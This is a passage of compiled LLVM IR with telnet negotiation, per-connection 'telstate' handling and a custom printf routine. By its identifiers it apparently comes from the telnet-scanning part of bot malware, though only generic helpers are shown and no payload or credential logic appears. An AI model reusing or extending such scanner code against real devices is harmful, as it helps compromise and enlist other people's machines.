declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #2 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #2 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #7
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #2 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #7
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t* nocapture, i32) local_unnamed_addr #2 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #7
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #2 {
  tail call void @advance_telstate(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #2 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #14
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #2 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.575, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #2 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #2 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #2 {
  %3 = alloca i32, align 4
